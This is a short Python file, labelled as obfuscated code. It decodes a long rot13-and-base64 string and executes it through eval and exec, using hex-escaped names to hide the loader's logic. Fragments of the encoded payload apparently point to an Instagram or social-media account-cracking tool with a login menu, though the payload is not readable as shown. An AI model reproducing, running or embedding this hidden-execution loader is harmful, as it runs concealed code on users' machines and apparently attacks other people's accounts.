# Python code obfuscated
 

import base64, codecs
magic = ''
love = ''
god = ''
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
